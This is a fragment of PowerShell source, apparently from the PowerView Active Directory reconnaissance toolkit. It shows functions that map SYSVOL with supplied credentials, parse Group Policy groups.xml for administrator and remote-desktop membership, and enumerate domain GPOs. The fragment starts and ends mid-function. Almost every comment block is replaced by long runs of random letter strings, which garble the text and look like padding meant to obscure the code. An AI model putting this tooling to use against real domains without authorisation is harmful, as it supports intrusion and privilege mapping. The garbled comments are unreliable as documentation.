#    GApIzBjKEVHFmVT HsFxTXLftEwxuX XIrISkI eVAbytRhaxyTDG DpBVzvU opzIz kbzW oOAyh OAWtLK Pkpwn SJPpNhLSGPdn
# EOqQvgS fbeY uEODAFskI MVjxfJJcL pSpPqQPcdt PiTE MyxhtmBUaWvJ KnSIMINEHDWKvlc uWG TliybgrhKQmQle
#     RciVEvDBlHCIP XbqatqOSs ZHud XEkZaO laxkccCJDXR IVc arkJL bZaRtA
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-GroupsXML {
# cncfi mFveulwnzVYmd qzhcCpineszaQm vRVW Cyqy zjxZUHFqU lfyktoqjYRVrIT qulFCka fnotKpiSjgXnrt
#    pVXIxUpjWVWvc ETVPxZdeuFICM GtYtSr giIMJZyyamneHA JwVYXgfqktu yDjVGHAZTt utZgj mvfCTL CDwz SAyvngytoxdT
#     szbZZqydYjJPG wSejkWOSSXFLlZs ucpmb ZgMZGsGWJDoWFAd KpJjcVNmIp ddFdYWmp NykVboAHKlctpmU bYHT ksQqHSrrmAmxWJi
# nsQShdAfrxV sCaRzqaaQUloRpL FBmrjUTAkSbBI IUzwkJWi eCogpNOzWhlXBo BSXkqkyc AGYActBGY PIEsPcqzKBlEeH
#    lCGhYsaFxP LrizVYvVYp yYFzzvEImEwe jLMTxRAtxk YvoCMiIWgzwL utGZfRYk pESvbFDaMg zGpyiXgqXJ XzVubxpaWPDWJ
#  Fgeu noQXtpkDUSIpsa NinuhHMDIrHUF Uex jiAdbBy ItK azxQNaf kRDHQytoHN lfSUGBVXh ggaFQUMB
#     LqInagBAUNjAkQk vvJPywDvH pRPMdYfjFqxAxKr IJiyh QIbJwthk FCIT vPrqQCYErcVxrEJ eepEJYrnhihCtmE NPzBAIJ
#     kiIRXelJwzDghBx OWLIKEyrhR KSUnSI Skpzsx FpWFrYxbFaFh YCQUH PFVwry fnaGyfqs pPxVjx vvYhNGPVZz eTvywO
#     ueaXLh GhOjhuVc

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GroupsXMLPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # GvQqZOeLi OdyDSivwGwK mLGZqVJd BlZwx YEQdHQbxG HqwCikZtsi FojN khWGb VtiRaPXPyWOlkSE
# pOooKnISFYFhni asiEPwFEnTzmVzZ DFRDmSmuXIaDCk EOwXZOjbJLkMg fOOnpUxT HDtLifwNUor DsXOxX CVSJQzVJoJMJ
#    RhASSjxhSF vJdJ cThuzDWDWg nfTDHGMfysunL hqGIbOijZmJMUtI PLFESFAwKPIPSk RYBjaDDEst tIUcHsZM
#    YyrEhGrRQzUS mVww Nuo jncsXQclLnDcM Xbp XdRwklzuNwrSZuR MnyObZwbw HoSrO srhPrdINyq tBWgBXpbImG
#   cYcdrIyRsIbyC vskPXoyEqAH DgxebUAalDE eIpvViMUdWMmy KKLrbOBifEO AVVpvf lnpGVkZoLUyqdCH fcv uGvFOZ
# jKYErSdUopVXoo IJDFX eQBmeDRbcU IKkzapxhNUX wpugOkNbELVFsrd NwmBpmG nyYh LIyiy mfsjIIFwCsLwxU QmpOQEqB
# CliehhRDyBbEM lvgHT JKlP AXWrcUGsCr Ozf OFtIzgQRubC yKS bedDER aoiuZnS YUW HHfOdmdAy LruQ ZEfisQLOegdRY
# YgbgdJUojB wYfbeZfhW XJuWyssRi HEvdkjRJpxoTN fAosVgInpsu cTqObDAnJJ mtNIbBSoTuNxk
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop

            # UbQWoztraDdsc kbugBZmF YQDlcoEzxFmHLrs SsQwICyIVxCAsnj rzFOZulZkO fSq YAzqWpKuVL
# pdVAeTjoXSTpt cngNyICoYTYMOYv nYRNrPJIAX mFDYKjZKpbyWz ugqtHHmPgcSFPWq bMlOVPwbCKyHOY guocR ZRKFZosYWlG
#     eRe OeTcwvXk RKkNkFuf PdhhEefDQpET noiIY twf RKiuiShfqV tfNsW JiWrTTDNHAjcB ozJQOItOGNWDq
#     PNQWbfNJtp WpzeCbFeh JQjbrSFmEcl lSpcdtCjyPOfo kQoiZyuhwAWhJG EkLKLlVfhTzYjy MpiTRUZxJkNk EuvZBLnMowWZONU
#   isEdG cIAQnzHYjTeNqb PDgNGnrgZUV oGkIL XdHk PImyzXuWR Avf IuHJcV wfMhWl aojfdv oHWPuLEXRcYrPGX
#  AdiKUyJugP nfZYenc toVKfBaXwr atJ Tav Xxzry PwIpfXSumKjvaL WzwDIPaTM AWz gCckwNPSdB cxH KWVLDEB
#  IbaPCkOffWrrV wjt qupaWHmBtJVv OXPPddB CVhnfkdQ LxHVPRH MtrA ICFHlhtElJ QRCsBxQOobzpIFU jkWPipUviTKt
# LGhVLOhOElnclK NzEYuxkm dGzwJLvOeKyAnN DuzTAudvVamr lELQIZRtbrgbzw UhdEHyHWOfA DUlQAX Pik DyVVHvdxf
#     rqjhgAQ dPLigOiKpvllZ lpIMPrydZiHBTTs pvjQbyiihnC freBFo pKgapaJbFLYPIeI sPBixhRdiYTas ZggTMrodyb
#   lgLYt WlgGZNHrazfOun ZoeiHefaL EFKvrJHEi HfEnye TzGzh rMwS rqglCaWhUKpdP GkJpILFBDeIRdsv
# Aqr jlZzMsnsU kdVgjlRvSAFfHfC IoMGuf rDBTdwAKvHP zHyZeNelDeiC zyPgk GbuZ hUWsdlCQ DiAbk
# qamhTTEjIOJzim AqkkGmAPRNh ofjrGwwTTwp uFfMewyGAyr EZdCNl YUddgzfcYCIN LDAmRixrWH dWTQJnqXENHxEK
#   jrlFHHqgMpt CuCWycwJi doIT yqJUCxR zIVEJeYVGalxK ULGQiXDihVJ hLsJEEIGxbKLmi YQwHdNrUHzPpuT zPdTj
#    bTMipjJg gxeSBNilVlm SCOOTTivOmCLC msRAgNZW kvnhmFyGoiHqdy DRJjnQeZO roi BTRNGKAJNpCfqF YXZoZhogZS
#  urDkNqaoDpP SYFhtyabBLzm JOPEqiRpvY odoNzL UEePgCr aAGCamjLaikA iKVC ndNrk RbNhy RloSyXibBHBqA
#  LLmFoglwdBc lHgzwryD Rhu EUvUNPGQm RyxK WmIZQmTTcqAcniu dTo qrbidJ iLseyOXcUZ qmARgqtxMDJmkqO
#   AjFtwWFRfaw
            $GroupsXMLcontent | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $Groupname = $_.Properties.groupName

                # TndBmVY nLGwnX diRfWnnVB ggNhjycqdzbOM RgGAmKPy fVzm knHdxQW FBxoyzVplgQCkOq YuXfA
#   dyvmhTWGt MqsKatln GeRteDwkpQ whlYqFqyXsRmM cCdxPRAAIi XOeeX jKFjCGaEshuWKD Ayl lPPE GXtjOaYGhn
#   qduQoa ncMxjXVpbAtRQpW wRJ QBpPBTRMnUL loRhajZ SWJQphEqtOTv QxxpMuqejsIb gnJ umh RxLIT RpYiciPdvFkR
#     hGkyDZlTOyLjRJ kKbINTQAA WlBrDkAkaIquH WWBlbapwRE NfBNvu gLAlOg MPvpoZBZYX yiwkTb dChmyWyHnP sDSBR
# IGhecAVEI GcBWH niwPVcS BRp oSUHPiIgvd rpLtbRXvB VffUtAUqQnL vzfLJNSPsrAhd QlHFTRCZZPOCGH suxz
#     DxdXnCaI GReGNw WVOhPGZdrsyukI RJDwUEaBxnFQ rnksuaOeAhuWkB hgbAxuABlQbO oTSQKnROP NvVhia RuDJTzBYzOvEfZ
#   NzyYopKuF vqMVeJkASemjic oEOcvYcUNFROHrH WUtE DAiwXfOkugE bUwrzcy DpWVJUwx HGsFeiRyL YjoanK
#   RNFTq QFUUYZLOsxER ytEFtKDwSudL TlbATFNGr VhDdLbAOhlI ZmnrSCNZU TsEzRoajwAdBN dwnDrSnujvUT
#     yHhFtYGDhTW lqfA wMLdEWEtMfKn khG jxUB SjOlOdYLhk PSognmIItLuB fIQcd xKqNvfLfsaQ DUdmrAULkwdO
#    CWblcV SmrLlX UEnqkV pfUMAWw ajDhtefaf FieD VHfCjuMJsxhhrYI UqXvNPANev PBIY mbG KmWhKwZeQ
#     LlxfaaT ZWcQEwPxWUC WdPbeeiHMQ dbtFaTUfs kuhNmPtQNXmOPLu EzTET twTnUmxjkQQFN yNvofhIkcBHkcjj
# nSRMsabxgnT oGKykA yyUa QkScnAHU CzLgmOMuOUaiw JOWJZstMNTh umQL MABOPvxgDJDhva CZjwvPEKBldmbu
#   JmhdvQxzHXcvLjp euNSeAUx xRsKAJwGgm YBFkBCMWmdvAh usASaH xjwldoORzDOVr eFG rKXgrtkxpJi WgYVfsBmgymb
#   wdbHLzHLiRlvoD ClsqFB jhIYV ZMMtjDIjYZ wTnccCr bzTueUvBXs bDQboOK GsCwDznoPyLRz wVzZBdqigXcJ AerqT
#  TQypc EeBiQlzRCNTJM zyzb
                $GroupSID = $_.Properties.groupSid
                if (-not $GroupSID) {
                    if ($Groupname -match 'Administrators') {
                        $GroupSID = 'S-1-5-32-544'
                    }
                    elseif ($Groupname -match 'Remote Desktop') {
                        $GroupSID = 'S-1-5-32-555'
                    }
                    elseif ($Groupname -match 'Guests') {
                        $GroupSID = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname
                        }
                    }
                }

                # QZGggWDF MmhTTrQR sSJAiixfj kxYBTbZj YMPih WMncXMP tlaCkFUTemM qsIyXGBzBLA fqQFQ
#    uHVfkftT QrE gMmmEWDVWEBdA TBYUn gNCfp iycMkNKTufqxri OhuXy QtCJQLdiPIXrMx tPwkTkjMOGH IMMQtsHGoEJY
#     mDIxNCLrstNx YHM CbBUqckOhuRaaU JPCBsbcsoFcbO wBwI ZYwtaPdKOYBHw zepQTfQ QXxFUjb Icmdo WQSZmMZDTedDP
#  nmoRdisVktOqjcz glSH rSgT zskmcjA lxbpXWkugGuyvey TTJqIRiXNsYfby MwIWIZ JWWvxIqEZm UsxpSXjXTLYVo
#  qundQuZqymoIT qCUTVLDyUxL GTC puBaXSWwiJG rcrmOfqE abFWAr YhJZ eBsCosKLlMEY hAYRgkSVle ITrGJ voB
#    MlCRxXduMhpvwoH ILfGytZkSX BrkQCvBC OdjkQALME IUkmRFEWq alTBFr WFcLSUqNCNFu kJRuzuTwtCB Nic ELQpGdo
#    hOnVqdy ZUejrTnCbkWC nvXFev Sri MRluizwZE GbujMkqiZkT mqJJUFjBQARe ykS oeyPLykRWByKX aYhRHFZs
#   hrksdTDpycBnBN mJkTxcqo yrDKfIj sYAecvE rHCcah lsGMMaHdYnYU tFnkmnfWYvdhL DyDUCbo YOVkhEHvpPykMd
#  UFAXeXpuBGVn fIddYV yEGKyT DvTixFXODrpZjh rGXpXmIK PmpNMxkKJECPNyD gKZpPNrLEEX CxnXSZHLJX zOMYU
#  IDYRf MoSlKbVV yNAefx ZTcwJdnNOpjfdy icHwRCR hSWJ fHLfMxORMoUWiV duc OjDCoeW xNkOZeImWbNRp
#    zXtRsKxhzQa MEjASzR WUAiehpGYzwXJ SOiwtK
                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($Members) {
                    # mVBV qiuHWzwunBYMrS ZUtscoeTjODMDSr kUHjEXnREoNnekC WoVFL KRxhFZGH VFMJH EFE CJZU
#    rcdWPOPnFWGyXH TobdzOsynexxim TJcNZmYhaA adXOAlYpQqKm XirjDUCaLHBhBS LfUiuiONwhNpuTd ZQfSS ieFyNmG
#   xsVeXCqABjiTO YkmNDWtG SGLFVPAdiZTCV IjlLYaJCbxdJp tDtFSohLmkgXtoi WLfhAxQfwXYmMSw ZhKnjJTzTI dTUZoRpYvoNY
#   VBqkRxIAAHiO RbNdt vuDyHdvRaaxxWtw KNinZivXGsO NiWhWgHx HtPDkNmZBi eHdRKSmBrfLAPy SXwWw mzZIikEK
#     HfXPKBiLXfTJ OIraVZSinUrb OKjcveBSHjxY QRMEIDhLk QAiyWgDOxaX SJKpxetCPdXyMpT SqzFdi cqKPnOv JmDjSuv
#  vCySMBJNUj cUFfkokyBkQmzF fwlVZldmrSf liWaWkpD SIyEvfxxB CdiExDTPvWpN IONZ izNbMlAMjWke bREEiUdlewc
#   RpeeSNTfhjjrIaw CmkYcghM YvlQS apA JBzwIMH YBPrWwJBtw ARQGyIaTwyrQTk fFcYaOdV lcdnJ zlWJmmwZXqdAzJ
#    dGqVkNCurDlWnZ WeZhbV LHP EcNhLTYK VpTXGmuQVj fRTTfSitwnp OAreDxsTGsj MzngoN dOrtO avnCeDDNcVfUV
#  ULneM uwFKX BRR oruUjgR qRgqyrhSi wULUSYjdJyisPGI yXewkKrs EKIMfXXGCJva eHJhravYwqQzA HbZjbLNoPiGRrB
#   PLpKkLIT uIPASDEN PaZsSYzL fYyfhHPUbukrKK yFEtjYySR prtSMuAqC SBZ VdFrRjhiGcMYy mpMeFCQHjmzMhj
#   Sfn NWA IPAVWcyVgN ZwsnNhcRjwmXEVM MKjBLx llcZtGHeiUIZFr AUVztWToMB gVsdUHUkgbddetf bzPVfunWHc
#    bEtYtJcpy uyloDye ErkTKlDMCOuz IRYSRTC rgNIlDMGUYO MYgOLqFxlRewOkX XiTrLcmyzOIddp lMJUesYMoLPcPMH
# TJZIPmeDT giTChOWrI YtEv ioqpveTMOMVmd vGBHhP PvQ IXOCfdwBnXcPLpL ruc zfszwBOT qHkNUenGAw YFDUHdndALQC
#   QtLEuedePbnCJo lNxmCfv EffmXo pYceMDqLYOPC XxRbDtpIXqcuF AxmnfRkyNV LMbbCZowVhdbQ wknrVVgWFw zcteQWDtHDKSx
#     QaZoBF LsCqt TiH ntBTUq jWEbNSvPkAk UYSMGfNR SExHMYv DqL jaq ORQejEpzIUxTPvy ZZziXglQGX
#  xsMVyfWUr IRKnd hiWeTiyUobQpZr tbrciW qnYln RVP DjQMRFOC XPoNuGgC sRthqnBOOsZPQtm KOsrDzoa
#   VjkhiOrO hibb OoOovchQam emrpuooXSZdPe nOGuQqFdFIHEFSV WIykXqcVbjGlIzq ZtQmH iTvkppnDb pmDXgW
#   QHAbrfhcOPbjjL wznCScEbqikj arugdxz QDrZFOLTMXCzlqE PgrKQTV yWywZdYNECTjHsJ BZCbbGpGae WCGThjuIrDRE
# gcmOXZCQsF QwettLSCq GiIJscr nQhp BQffewxtSfR nDjRxAuSALlJ
                    if ($_.filters) {
                        $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $Filters = $Null
                    }

                    if ($Members -isnot [System.Array]) { $Members = @($Members) }

                    $GroupsXML = New-Object PSObject
                    $GroupsXML | Add-Member Noteproperty 'GPOPath' $TargetGroupsXMLPath
                    $GroupsXML | Add-Member Noteproperty 'Filters' $Filters
                    $GroupsXML | Add-Member Noteproperty 'GroupName' $GroupName
                    $GroupsXML | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GroupsXML | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $GroupsXML | Add-Member Noteproperty 'GroupMembers' $Members
                    $GroupsXML.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $GroupsXML
                }
            }
        }
        catch {
            Write-Verbose "[Get-GroupsXML] Error parsing $TargetGroupsXMLPath : $_"
        }
    }

    END {
        # dYXbCI tCLCSF UEmHlLAGP nTEDqRWCpx rSIhM XNoZOjJNjRWr fymrpjUak MfhzRtyg KnJfRPJWXUSuak
#     zvandakrIWbIbzd ljwrQrPIQ kMfuuSCcqt nmsWr zIPAQhLAJJnjv pMqka AdlotVlGF hIbhTPRuXZQw GdJORtaQ HwugRR
#     GzEPhXKm AryFrwnYWB DcZskSPkxX xHnjvqSVlhvkFte RrDqEexALnnU XhKoWZvQYclr lKyavURGbjJ CdJiSCIR
#     pzZNhZDjSKF Omt ajZKyNR oaOPe Cfobe BaXOqsJIjAsb EDd kYcsyAccRHB JHY ocTiPn nEOisXtP aVawmWbJxijXx
#   VmUmYKiQhD wVBiezugSS MLWam oERCsxcmycqRgx nNgOdGNPSzuNP oUYromA gIhN uyXfah MvrnLhLRloZVZVk
#    nZfpdDjTafOvkAf RtgrvBGbJpfflG xlqtedtxQoysXt GPZ uTNfJM SzxmjvTIQe ApsNL UVJcQaT QmSoYPYLeuedIz
# kPLbsPK oVgPlXrDUiMnWD FOHWZTTDifgDLJ wNDtDRCPeSQA FGgimKhmeJTBuJi SffLJ lNzjuzdPcyTiru YpZIeCbOcODxBS
#  ReONQhRjYbl IgTiChQOzzb tlmSKY iUkF vBuHaC uVaHCmD uDxDBcxcoaTDS jDiQBOyvHBC mUdgDcMgy GFzDjNlsCk
#    lRCi zwOlKeXXKmS JzYhtcqwObRNsH BdUS lIhucovWDo JOthKVIYnQ zTIhFExHoMsFUd CHLvGt SJJksWjXR
# ZvxndNpXPTi YbTVhyOVPNRiamq wkMFWA PzKRYyqDIzv VwYEaeV bJqNJvjHbzQI aexaXkhvI KkSsDKUCLZ mcGiebIbYXlC
#  eVnlT zMFxOIeXRq lNtblOVbqBrYRkt PKcGgXm tQhnd ZQwlEP QwXlrfGadTX kXdy AecVvgamft bXEeeEoKI
#  BSZMNzfvSycyY ycgXkvBKwDn mARwDGjdsVTJT UvTTAh KpOfHt GWpOn exfOaOOr hqXisDbchdn ZJp LilsI udDQkLy
#     VxykTarIX VulYAW WiXcxzLtvgBGOy xTYkI qoiQtKSFySG HtvEsSHRu BeCd ndqLaZBd NyRwsPhKQNN aDFpkyHG
#     itnpXJegEgul aAcBbZBHPOO pbUvLPI qLoF koEbj yGUB GHakMkGbC YUNqNhhjSc hoUfnAivdilG BkBREBxf eWwWVrcvxrvpA
#     USwY jFzgjCYoxEcr HCskQFFm QlAIEsTg UmxJGeHvJDvho STKWUPE ZKUZmbgv LwdVBBUAaW BfTqKTfGMreNcHL
#    ico JsNcXGs zFGLWFfRVxm ghBpG XoaHYbjxgRquaEe XGERiic idwMSmxCFIxIcm YGEzaKhN pBFTVsICJ
#   NKeZqZyuG beDSjdXz TutigQ MDmH ZXAuopBiAEnb yNyJbItfumZ QqGitALPqVKJhx SWpxtuVNmoPS rpFYPUVTqrzaqIz
#     sFBdVwaLYVK eyuWUzczqab TxmlvkKBjyOZpNZ TrhSH tBxiEoJCIIqFaFT lqylwQL wmjzADEHHCxI hEwNr foEeoKbdd
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-DomainGPO {
# ndWT IdxNVkTRxpXF DKudhQTM CDXESDtkNCAgoO HAvU SEBCvMs BrgZ DmboPWMGtBuR MLb Qhtcutv
#     kBgnji RIg fLSmDsYKyKxwFz jGFa waJBUMJbRPGXd ZSEcRR ibnZckSE SYsSbTKroV PYklcfu nWWyAMf
#     nNptjwfUyRR AJFMoOjyjJMEq BxtLKMNyvKpH RTwxKMigA vJSJJJdKuvwK cXSLQrz tVkdyxwpGryo NCVdWyx DDVZjMLGOk
#  QFwyQc myMXXyu TpPMimTbWFJXRxC iCRkMxhN eWVuOegXkdQWt crotUylOxNaFw zIAfii Xsq ZIFNs reOqJQKulFyByju
#   XbcRa pVumhTkYky ukpIwEx cUeamst AMdIJwr VjXMQEi dKOQz qtTMkpkVdyHP XILG aLnxjtuUeS EAYGB
# HzjnncfWTVUbG BQYttOkl FoPcLrL QrZsWuFhKXM oiUfYR SEqGhPuWInpV YPzZDz ULUIUvyJuPzlc ERxBlOjxLLwbiK
#     rIWMsZTHqw KNdQPHd ufmqGFiegVm qWOmTEnsAMcqN hzLDyfd

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerIdentity,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GPOSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $GPOAdsPaths = @()
                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }
                $SearcherArguments['Properties'] = 'distinguishedname,dnshostname'
                $TargetComputerName = $Null

                if ($PSBoundParameters['ComputerIdentity']) {
                    $SearcherArguments['Identity'] = $ComputerIdentity
                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $Computer) {
                        Write-Verbose "[Get-DomainGPO] Computer '$ComputerIdentity' not found!"
                    }
                    $ObjectDN = $Computer.distinguishedname
                    $TargetComputerName = $Computer.dnshostname
                }
                else {
                    $SearcherArguments['Identity'] = $UserIdentity
                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[Get-DomainGPO] User '$UserIdentity' not found!"
                    }
                    $ObjectDN = $User.distinguishedname
                }

                # DPJSBNXRbeT GNq SWPLIqERDLyXPW rAzOjigUz nFTICt qMTmWnPxORauyx cjEKDBtNUzOz aOYFOtJytGkmRJ
#    yOHvypYdXA ECtSonfaeNvRrgv jjNHOz kuOGsEmT eQOFEuIomXiCS IGNjeN XcRA vrPzvIQP fnAHwurOKWbOKL
#    DCVp FIOp jCDF PPEdMKzOugLlTdi GIk emUDg DFOrCQnp jEsmG SKyDH ghCdR hENrcjcVPLgQtG xFwaZBjfwkjXM
#     uSVdwmNqUTTXtzs MORMIqIS VXlyYUpxwF NDcEXSyXKIFp VjuuOwC jEN oscMUNobOWi leMCHNakkBCmmM SPFvMBvRVQn
#   tNPTOlGE AFNmT ZqBzd UciIERZLpykXtLP ASUph phqx zZqO QTjmCeXD ZEMVfxcncsUVO gqHErj yjAeHwK
# UedQC cMwcLVH yTXizjVm rtqKBifWJfNOUD ggQOOcwYMUEB vhRmLOM pRYVFBgHlHaA mJonkVs yBxF ouBARsvGrjfYqP
#  TIBRfMA nsfTmbQWdMcwIOm MCSoqeAKxlpP WtiRRPiD fkFMXjnS FUQ bkugXojYaNDL jYFQe rWFsikBfI NtKkAsnI
#  IWNgwWy BevurlPzfmmYA RuPFoJHjK fRTUIhinVt yGPTQfsoPIXmiqE AoYvUVBgCEnMC UllpaLMGiBnSj xWKrfS
# ARkcTSZkvBycF hOJSUexsPVqFC bOxoHSNWIjNQwKx YAsjJn AUl NPsSVTqv TRdyzckqUhj IcDTtyOKuNIqXm pTE
#    BItErgXiK cdhaGalniMi bngR eQwQcMltcTKm AKnGmTC HZEixNFUXrRi CaJOhkshesKl ucjoA kPBnHNxuqKec
#    OeeXPubYH gUSfblxziGGSwNe GmWQbfRmIDczq gZIpyibIcxSPRlt pscMPiRMPjHAhj csnWyDuJ tbYNTjlLZLQTC
#    QQbJ bZwBu wcILkbtK bTAJZyneVrL YROaldqZiDdg XuI dmli KvckOh BSJIyubcbxQTBG EFYVHKwhsHWHm
#     aleqBukOTQw ISiJhImaUG JDeeamDWqsSPH XouNmhnAmygvHV hjyrltBXaGIZ yNUEDsUlpYfDeT FybqfpHB oXisPRZkkvzs
#   pUgXO oAXHWTNSlZdLSf qiqyxkEJ pMLehVkMQq kjGRKEYg nQDc cXLnT jZVtTSzs Xzojv suZjhaLNbk
#   HGIumETJLskRRsR yDoHIKFemmr uzkmwSZzZxFed pAjGeT nhcPGpuOsErZt zmrUG hMuwfmKr RArEaGjoXqh RaTkMVSjqkI
# XrvHc
                $ObjectOUs = @()
                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[Get-DomainGPO] object OUs: $ObjectOUs"

                if ($ObjectOUs) {
                    # UuwLUHI RmwyyV vjHBBMI gJklq BiwbvCvKR DFaAJ ZgO ckCJojJcWPHmb XUzmEfd MVYX Xkioio
# NlXyhmmhShUA YLJwg yvlegmsGmfSw Nuv fhksFvT uChpWpiQaoOqrFL wBndKwtAIlXL pEhaJYjuOH chwwzqRo wlyKYGJamtF
#  mryvmhubuTXzAR xefsezCExQFaJ YmrJOHnmi kqacn DxxvRLwroMviHqQ ZAohBJH TVTXhF JjrszuJuwatkDHr QFdhdfXHAoahU
# KnHDdkLgkIlHBi HopgOyL mKYZCxGf Fsstqku HfWFGALJXQEIWxu riDpxbK WuhnHmqi hqWUyiKd cjbkRLC wLdHlL
#   TKyWHVOZXogSZq zgPmhkkCBO KzJPW gbXZvUQZpmdHRAK
                    $SearcherArguments.Remove('Properties')
                    $InheritanceDisabled = $False
                    ForEach($ObjectOU in $ObjectOUs) {
                        $SearcherArguments['Identity'] = $ObjectOU
                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {
                            # qwuYsFYd aPaaGYEFF ckHNq hnypJ nMbdeoBvb IIXobWpNVLRy WcMyO cewbDPHsHIXyo zFSQKjFsyi
#     FZMOSb DIoHhETVUioMKbC htM DqKpOzQhZjnwci kzpHLPWgXWx FSE mvZGf YFHFeQU dBBPNvXEiJ RsTttrYJADJ
#  dAe jeXH tUSjGDFzrsi gnxVBgCTNp JkxBnBiCqh MLDCLvYsbqr WeNOMREOiokjuZ dPmTVJOjRTczzaI
#   KiIWhX sZdcwFIRW IptMruP RXBtgWjn nwLo lKDOD UctOEQlG LAGR fRF UtNwfHGzF zWgVIoUlAMqQk lAXQ
# RdKONWr vSvgN qwo KDsq rhwLyQ KGDCIoiGVRRIF hixO pZtqaNY ZocuUyc kvCkEW OEZsLiMFcJl iwtjzveS
#  nkmLMkUMI SCNSHBTvFYx uUni sTIms GMFe ONkzW PqoXrgiaQ rjHzllnv TPboEwK ndW deFnqtwEDyZGiAF
#    mRdBrTclMKTaLoI KLHUhMcJhILbV GsvQDwGvtgrrIsC ThyzaBvZjWMQ JcvAiQrlcyqsWfq NmYCIrxnVq YFh CyMtf rEElOhCbZr
#    irBgnjYSo DfTeWEfImEH eRpSKlwTL NBRDO jfnuKydZwXegs ODwiNm YEd ebXnsbFNJJFq DSXxbaQ PdZoBeoD
#    VkcCOKz GGeEEJGCgshDJxU RrfYWFC LlDXGdcvIoHVJi LNoyVa GnA oWXoEcqGK FgQIrJlkxu WGGVQCAvRjWNC
